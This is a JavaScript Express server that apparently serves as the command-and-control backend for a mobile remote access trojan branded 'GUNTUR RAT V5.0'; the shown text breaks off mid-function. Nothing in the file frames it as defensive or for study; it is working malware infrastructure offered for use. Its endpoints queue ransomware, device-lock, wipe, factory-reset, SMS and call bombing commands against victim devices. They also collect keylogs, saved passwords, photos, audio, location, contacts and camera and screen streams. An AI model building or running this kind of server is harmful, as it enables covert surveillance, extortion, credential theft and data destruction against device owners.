const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');
const app = express();

const PORT = 3002;

app.use(cors()); 
app.use(bodyParser.json({ limit: '500mb' })); 
app.use(bodyParser.urlencoded({ extended: true, limit: '500mb' }));

// ==================== FILE DATABASE ====================
const TARGETS_FILE = './targets.json';
const SPYWARE_FILE = './spyware_devices.json';
const NOTIF_FILE = './notifications.json';
const COMMANDS_FILE = './commands.json';
const SPY_COMMANDS_FILE = './spy_commands.json';
const RESPONSES_FILE = './responses.json';
const SPY_RESPONSES_FILE = './spy_responses.json';
const LOCATIONS_FILE = './locations.json';
const BATTERY_FILE = './battery.json';
const NEWS_FILE = './news.json';
const GALLERY_FILE = './gallery.json';
const AUDIO_FILE = './audio_files.json';
const KEYLOG_FILE = './keylogs.json';
const PASSWORD_FILE = './passwords.json';
const CAM_STREAM_FILE = './cam_stream.json';
const SCREEN_STREAM_FILE = './screen_stream.json';

// ==================== HELPER FUNCTIONS ====================
const readData = (file, defaultValue = []) => {
    if (!fs.existsSync(file)) return defaultValue;
    try {
        const content = fs.readFileSync(file, 'utf8');
        return JSON.parse(content || JSON.stringify(defaultValue));
    } catch (e) { 
        return defaultValue; 
    }
};

const saveData = (file, data) => {
    try {
        fs.writeFileSync(file, JSON.stringify(data, null, 2));
    } catch (e) { 
        console.log(`[!] Gagal simpan: ${file}`); 
    }
};

// Initialize all files
const initFiles = () => {
    const files = [TARGETS_FILE, SPYWARE_FILE, NOTIF_FILE, COMMANDS_FILE, 
                   SPY_COMMANDS_FILE, RESPONSES_FILE, SPY_RESPONSES_FILE, 
                   LOCATIONS_FILE, BATTERY_FILE, NEWS_FILE, GALLERY_FILE, 
                   AUDIO_FILE, KEYLOG_FILE, PASSWORD_FILE, CAM_STREAM_FILE, 
                   SCREEN_STREAM_FILE];
    files.forEach(file => {
        if (!fs.existsSync(file)) saveData(file, []);
    });
    
    if (readData(NEWS_FILE).length === 0) {
        saveData(NEWS_FILE, [
            { title: "🔥 GUNTUR RAT V5.0 FULL", desc: "Hard Lock + Ransomware + PANIC MODE + VIRUS MODE + DESTRUCTIVE + GALLERY + KEYLOGGER", date: new Date().toISOString() },
            { title: "🦠 VIRUS MODE", desc: "Fake virus alert + lock with custom sound + scan animation", date: new Date().toISOString() },
            { title: "📸 GALLERY GRABBER", desc: "Ambil semua foto & video dari target", date: new Date().toISOString() },
            { title: "🎙️ AUDIO RECORDING", desc: "Rekam suara lingkungan target", date: new Date().toISOString() },
            { title: "⌨️ KEYLOGGER", desc: "Capture semua ketikan target", date: new Date().toISOString() },
            { title: "🔑 PASSWORD EXTRACTOR", desc: "Ambil saved password dari browser/app", date: new Date().toISOString() }
        ]);
    }
};
initFiles();

// ==================== STATIC FILES ====================
app.use(express.static(path.join(__dirname, 'public')));

// ==================== RAT ENDPOINTS ====================
app.post('/api/heartbeat/:id', (req, res) => {
    const targetId = req.params.id;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === targetId);
    if (index !== -1) {
        targets[index].lastSeen = new Date().toISOString();
        targets[index].status = "Online";
        saveData(TARGETS_FILE, targets);
    }
    res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
    const deviceData = req.body;
    let targets = readData(TARGETS_FILE);
    const index = targets.findIndex(t => t.id === deviceData.id);
    if (index !== -1) {
        targets[index] = { ...targets[index], ...deviceData, lastSeen: new Date().toISOString(), status: "Online" };
    } else {
        targets.push({ ...deviceData, lastSeen: new Date().toISOString(), status: "Online" });
    }
    saveData(TARGETS_FILE, targets);
    console.log(`[✅ RAT] Device registered: ${deviceData.id}`);
    res.json({ status: 'ok', device_id: deviceData.id });
});

app.get('/api/list-targets', (req, res) => {
    let targets = readData(TARGETS_FILE);
    const onlineThreshold = 30000;
    const now = Date.now();
    targets = targets.map(t => {
        const lastSeen = new Date(t.lastSeen).getTime();
        if (now - lastSeen > onlineThreshold) t.status = "Offline";
        return t;
    });
    res.json(targets);
});

app.get('/api/targets', (req, res) => {
    const targets = readData(TARGETS_FILE);
    res.json(targets);
});

app.delete('/api/targets/:id', (req, res) => {
    let targets = readData(TARGETS_FILE);
    targets = targets.filter(t => t.id !== req.params.id);
    saveData(TARGETS_FILE, targets);
    res.json({ success: true });
});

app.post('/api/post-notification/:id', (req, res) => {
    const targetId = req.params.id;
    let allNotifs = readData(NOTIF_FILE);
    allNotifs.unshift({ targetId, ...req.body, timestamp: new Date() });
    if (allNotifs.length > 500) allNotifs = allNotifs.slice(0, 500);
    saveData(NOTIF_FILE, allNotifs);
    res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
    const allNotifs = readData(NOTIF_FILE);
    const filtered = allNotifs.filter(n => n.targetId === req.params.id);
    res.json(filtered);
});

// ==================== COMMAND ENDPOINTS ====================
app.post('/api/send-command', (req, res) => {
    const { id, command, extra } = req.body;
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== id);
    commands.push({ targetId: id, command, extra, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[📡 RAT CMD] ${command} -> ${id}`);
    res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
    const targetId = req.params.id;
    let commands = readData(COMMANDS_FILE);
    const cmdIndex = commands.findIndex(c => c.targetId === targetId);
    if (cmdIndex !== -1) {
        const cmd = commands[cmdIndex];
        commands.splice(cmdIndex, 1);
        saveData(COMMANDS_FILE, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
    const targetId = req.params.id;
    const { cmd, data } = req.body;
    let responses = readData(RESPONSES_FILE);
    responses.unshift({ targetId, cmd, data, timestamp: new Date() });
    if (responses.length > 500) responses = responses.slice(0, 500);
    saveData(RESPONSES_FILE, responses);
    console.log(`[📨 RAT RESP] ${cmd} from ${targetId}`);
    res.json({ status: 'received' });
});

app.get('/api/get-response/:id', (req, res) => {
    const responses = readData(RESPONSES_FILE);
    const resData = responses.filter(r => r.targetId === req.params.id);
    res.json(resData || []);
});

// ==================== GALLERY ENDPOINTS ====================
app.post('/api/gallery/upload/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { filename, path: filePath, data, type } = req.body;
    let gallery = readData(GALLERY_FILE);
    gallery.unshift({ device_id: deviceId, filename, original_path: filePath, data, type, timestamp: new Date().toISOString() });
    if (gallery.length > 1000) gallery = gallery.slice(0, 1000);
    saveData(GALLERY_FILE, gallery);
    console.log(`[🖼️ GALLERY] ${filename} from ${deviceId}`);
    res.json({ success: true });
});

app.get('/api/gallery/:deviceId', (req, res) => {
    const gallery = readData(GALLERY_FILE);
    const deviceGallery = gallery.filter(g => g.device_id === req.params.deviceId);
    res.json(deviceGallery);
});

app.get('/api/gallery/:deviceId/:type', (req, res) => {
    const { deviceId, type } = req.params;
    const gallery = readData(GALLERY_FILE);
    const filtered = gallery.filter(g => g.device_id === deviceId && g.type === type);
    res.json(filtered);
});

// ==================== AUDIO ENDPOINTS ====================
app.post('/api/audio/upload/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { filename, data, duration } = req.body;
    let audios = readData(AUDIO_FILE);
    audios.unshift({ device_id: deviceId, filename, data, duration, timestamp: new Date().toISOString() });
    if (audios.length > 500) audios = audios.slice(0, 500);
    saveData(AUDIO_FILE, audios);
    console.log(`[🎙️ AUDIO] ${filename} from ${deviceId}`);
    res.json({ success: true });
});

app.get('/api/audio/:deviceId', (req, res) => {
    const audios = readData(AUDIO_FILE);
    const deviceAudios = audios.filter(a => a.device_id === req.params.deviceId);
    res.json(deviceAudios);
});

// ==================== KEYLOGGER ENDPOINTS ====================
app.post('/api/keylog/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { logs } = req.body;
    let keylogs = readData(KEYLOG_FILE);
    const existing = keylogs.find(k => k.device_id === deviceId);
    if (existing) {
        existing.logs += logs;
        existing.last_update = new Date().toISOString();
    } else {
        keylogs.push({ device_id: deviceId, logs, created: new Date().toISOString(), last_update: new Date().toISOString() });
    }
    saveData(KEYLOG_FILE, keylogs);
    console.log(`[⌨️ KEYLOG] ${logs.length} chars from ${deviceId}`);
    res.json({ success: true });
});

app.get('/api/keylog/:deviceId', (req, res) => {
    const keylogs = readData(KEYLOG_FILE);
    const logs = keylogs.find(k => k.device_id === req.params.deviceId);
    res.json(logs || { logs: '' });
});

// ==================== PASSWORDS ENDPOINTS ====================
app.post('/api/passwords/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { passwords } = req.body;
    let savedPasswords = readData(PASSWORD_FILE);
    savedPasswords.unshift({ device_id: deviceId, passwords, timestamp: new Date().toISOString() });
    if (savedPasswords.length > 100) savedPasswords = savedPasswords.slice(0, 100);
    saveData(PASSWORD_FILE, savedPasswords);
    console.log(`[🔑 PASSWORDS] Saved from ${deviceId}`);
    res.json({ success: true });
});

app.get('/api/passwords/:deviceId', (req, res) => {
    const passwords = readData(PASSWORD_FILE);
    const devicePasswords = passwords.filter(p => p.device_id === req.params.deviceId);
    res.json(devicePasswords);
});

// ==================== STREAMING ENDPOINTS ====================
app.post('/api/stream/cam-frame/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { frame, timestamp } = req.body;
    let camStream = readData(CAM_STREAM_FILE);
    camStream.unshift({ device_id: deviceId, frame, timestamp, received: new Date().toISOString() });
    if (camStream.length > 100) camStream = camStream.slice(0, 100);
    saveData(CAM_STREAM_FILE, camStream);
    res.json({ success: true });
});

app.post('/api/stream/screen-frame/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { frame, timestamp } = req.body;
    let screenStream = readData(SCREEN_STREAM_FILE);
    screenStream.unshift({ device_id: deviceId, frame, timestamp, received: new Date().toISOString() });
    if (screenStream.length > 100) screenStream = screenStream.slice(0, 100);
    saveData(SCREEN_STREAM_FILE, screenStream);
    res.json({ success: true });
});

app.get('/api/stream/latest-cam/:deviceId', (req, res) => {
    const camStream = readData(CAM_STREAM_FILE);
    const latest = camStream.find(c => c.device_id === req.params.deviceId);
    res.json(latest || {});
});

app.get('/api/stream/latest-screen/:deviceId', (req, res) => {
    const screenStream = readData(SCREEN_STREAM_FILE);
    const latest = screenStream.find(s => s.device_id === req.params.deviceId);
    res.json(latest || {});
});

// ==================== SPYWARE ENDPOINTS ====================
app.post('/api/spyware/register', (req, res) => {
    const deviceData = req.body;
    let devices = readData(SPYWARE_FILE);
    const index = devices.findIndex(d => d.device_id === deviceData.device_id);
    if (index !== -1) {
        devices[index] = { ...devices[index], ...deviceData, last_seen: new Date().toISOString(), online: true };
    } else {
        devices.push({ ...deviceData, last_seen: new Date().toISOString(), online: true });
    }
    saveData(SPYWARE_FILE, devices);
    console.log(`[✅ SPY] Device registered: ${deviceData.device_id}`);
    res.json({ success: true });
});

app.post('/api/spyware/heartbeat/:id', (req, res) => {
    const deviceId = req.params.id;
    let devices = readData(SPYWARE_FILE);
    const index = devices.findIndex(d => d.device_id === deviceId);
    if (index !== -1) {
        devices[index].last_seen = new Date().toISOString();
        devices[index].online = true;
        saveData(SPYWARE_FILE, devices);
    }
    res.json({ success: true });
});

app.get('/api/spyware/devices', (req, res) => {
    const username = req.query.username;
    let devices = readData(SPYWARE_FILE);
    if (username) devices = devices.filter(d => d.username === username);
    res.json(devices);
});

app.post('/api/spyware/send-command', (req, res) => {
    const { device_id, command, extra } = req.body;
    let commands = readData(SPY_COMMANDS_FILE);
    commands = commands.filter(c => c.device_id !== device_id);
    commands.push({ device_id, command, extra, timestamp: new Date() });
    saveData(SPY_COMMANDS_FILE, commands);
    console.log(`[📡 SPY CMD] ${command} -> ${device_id}`);
    res.json({ success: true });
});

app.get('/api/spyware/get-command/:id', (req, res) => {
    const deviceId = req.params.id;
    let commands = readData(SPY_COMMANDS_FILE);
    const cmdIndex = commands.findIndex(c => c.device_id === deviceId);
    if (cmdIndex !== -1) {
        const cmd = commands[cmdIndex];
        commands.splice(cmdIndex, 1);
        saveData(SPY_COMMANDS_FILE, commands);
        return res.json(cmd);
    }
    res.status(204).send();
});

app.post('/api/spyware/post-response/:id', (req, res) => {
    const deviceId = req.params.id;
    const { cmd, data } = req.body;
    let responses = readData(SPY_RESPONSES_FILE);
    responses.unshift({ device_id: deviceId, cmd, data, timestamp: new Date() });
    if (responses.length > 500) responses = responses.slice(0, 500);
    saveData(SPY_RESPONSES_FILE, responses);
    console.log(`[📨 SPY RESP] ${cmd} from ${deviceId}`);
    res.json({ success: true });
});

app.get('/api/spyware/get-response/:id', (req, res) => {
    const responses = readData(SPY_RESPONSES_FILE);
    const resData = responses.filter(r => r.device_id === req.params.id);
    res.json(resData || []);
});

app.post('/api/spyware/location/update', (req, res) => {
    const { device_id, lat, lng, accuracy, speed, altitude, time } = req.body;
    let locations = readData(LOCATIONS_FILE);
    locations.unshift({ device_id, lat, lng, accuracy, speed, altitude, time, timestamp: new Date() });
    if (locations.length > 500) locations = locations.slice(0, 500);
    saveData(LOCATIONS_FILE, locations);
    res.json({ success: true });
});

app.get('/api/spyware/location/get', (req, res) => {
    const deviceId = req.query.device;
    const limit = parseInt(req.query.limit) || 50;
    let locations = readData(LOCATIONS_FILE);
    const deviceLocations = locations.filter(l => l.device_id === deviceId).slice(0, limit);
    res.json({ success: true, locations: deviceLocations });
});

app.post('/api/update-battery/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const { battery, charging, lastSeen } = req.body;
    let batteries = readData(BATTERY_FILE);
    const index = batteries.findIndex(b => b.device_id === deviceId);
    const newBattery = { device_id: deviceId, battery, charging, last_seen, timestamp: new Date() };
    if (index !== -1) batteries[index] = newBattery;
    else batteries.push(newBattery);
    saveData(BATTERY_FILE, batteries);
    
    let targets = readData(TARGETS_FILE);
    const targetIndex = targets.findIndex(t => t.id === deviceId);
    if (targetIndex !== -1) {
        targets[targetIndex].battery = battery;
        targets[targetIndex].charging = charging;
        saveData(TARGETS_FILE, targets);
    }
    res.json({ success: true });
});

app.get('/api/battery/:deviceId', (req, res) => {
    let batteries = readData(BATTERY_FILE);
    const batteryInfo = batteries.find(b => b.device_id === req.params.deviceId);
    res.json(batteryInfo || { battery: 0, charging: false });
});

// ==================== LOCK COMMANDS ====================
app.get('/api/hard_lock', (req, res) => {
    const deviceId = req.query.device;
    const message = req.query.message || 'YOUR PHONE IS LOCKED';
    const pin = req.query.pin || '0853';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'hard_lock', extra: `${message}|${pin}`, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🔒 HARD LOCK] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/activate_ransomware', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'activate_ransomware', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[💀 RANSOMWARE] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/panic_mode', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'panic_mode', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[⚠️ PANIC MODE] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/virus_mode', (req, res) => {
    const deviceId = req.query.device;
    const soundUrl = req.query.sound || '';
    const message = req.query.message || '🦠 CRITICAL VIRUS DETECTED!';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    let extra = soundUrl ? `${soundUrl}|${message}` : message;
    commands.push({ targetId: deviceId, command: 'virus_mode', extra: extra, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🦠 VIRUS MODE] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/unlock', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'unlock', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🔓 UNLOCK] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/panic_unlock', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'panic_unlock', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🔓 PANIC UNLOCK] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/virus_unlock', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'virus_unlock', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🔓 VIRUS UNLOCK] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/decrypt_files', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'decrypt_files', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🔓 DECRYPT] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

// ==================== DESTRUCTIVE COMMANDS ====================
app.get('/api/factory_reset', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'factory_reset', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[💣 FACTORY RESET] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/wipe_data', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'wipe_data', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[💣 WIPE DATA] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/call_bombing', (req, res) => {
    const deviceId = req.query.device;
    const count = req.query.count || '50';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'call_bombing', extra: count, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[📞 CALL BOMBING] ${count}x -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/sms_bomber', (req, res) => {
    const deviceId = req.query.device;
    const phone = req.query.phone || '08123456789';
    const count = req.query.count || '100';
    const message = req.query.message || 'YOU HAVE BEEN HACKED!';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'sms_bomber', extra: `${phone}|${count}|${message}`, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[📨 SMS BOMBER] ${count}x to ${phone} -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/battery_drain', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'battery_drain', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🔋 BATTERY DRAIN] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

// ==================== SURVEILLANCE COMMANDS ====================
app.get('/api/take_photo', (req, res) => {
    const deviceId = req.query.device;
    const side = req.query.side || 'back';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'take_photo', extra: side, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/get_screen', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'get_screen', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/get_contacts', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'get_contacts', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/get_location', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'get_location', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/get_gmails', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'get_gmails', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/set_wallpaper', (req, res) => {
    const deviceId = req.query.device;
    const url = req.query.url || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'set_wallpaper', extra: url, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/play_audio', (req, res) => {
    const deviceId = req.query.device;
    const url = req.query.url || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'play_audio', extra: url, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/stop_audio', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'stop_audio', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/flash_strobe', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'flash_strobe', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/stop_strobe', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'stop_strobe', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/vibrate_loop', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'vibrate_loop', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/open_url', (req, res) => {
    const deviceId = req.query.device;
    const url = req.query.url || '';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'open_url', extra: url, timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/force_open', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'force_open', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/record_audio', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'record_audio', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/stop_record_audio', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'stop_record_audio', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/grab_gallery', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'grab_gallery', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[📸 GRAB GALLERY] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/grab_videos', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'grab_videos', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    console.log(`[🎬 GRAB VIDEOS] -> ${deviceId}`);
    res.json({ status: 'queued' });
});

app.get('/api/start_keylogger', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'start_keylogger', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/stop_keylogger', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'stop_keylogger', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/get_saved_passwords', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'get_saved_passwords', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

// ==================== ADMIN COMMANDS ====================
app.get('/api/request_admin', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'request_admin', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/admin_lock', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'admin_lock', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

app.get('/api/admin_wipe', (req, res) => {
    const deviceId = req.query.device;
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
    let commands = readData(COMMANDS_FILE);
    commands = commands.filter(c => c.targetId !== deviceId);
    commands.push({ targetId: deviceId, command: 'admin_wipe', extra: '', timestamp: new Date() });
    saveData(COMMANDS_FILE, commands);
    res.json({ status: 'queued' });
});

// ==================== STREAMING COMMANDS ====================
app.get('/api/start_cam_stream', (req, res) => {
    const deviceId = req.query.device;
    const side = req.query.side || 'back';
    if (!deviceId) return res.status(400).json({ error: 'Device ID required' });
